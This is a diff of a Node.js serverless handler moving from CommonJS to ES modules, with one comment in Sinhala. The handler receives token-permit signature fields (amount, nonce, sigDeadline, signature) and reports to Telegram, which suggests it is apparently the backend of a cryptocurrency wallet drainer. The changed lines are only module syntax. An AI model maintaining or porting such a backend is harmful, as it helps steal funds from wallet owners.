@@ -1,5 +1,5 @@
-const { ethers } = require('ethers');
-const https = require('https');
+import { ethers } from 'ethers';
+import https from 'https';
 
 // ================================================================
 // TELEGRAM CONFIG
@@ -44,7 +44,8 @@ function sendTelegramMessage(message) {
     req.end();
 }
 
-module.exports = async (req, res) => {
+// ⭐ module.exports වෙනුවට export default පාවිච්චි කරන්න
+export default async function handler(req, res) {
     // CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -68,7 +69,7 @@ module.exports = async (req, res) => {
     try {
         const { user, amount, expiration, nonce, sigDeadline, signature } = req.body;
 
-        // ⭐ Debug Logs (පරණ එකේ තිබ්බා වගේ)
+        // ⭐ Debug Logs
         console.log('========================================');
         console.log('📥 REQUEST RECEIVED');
         console.log('  👤 User:', user);
@@ -154,4 +155,4 @@ module.exports = async (req, res) => {
             error: error.message
         });
     }
-};
+}
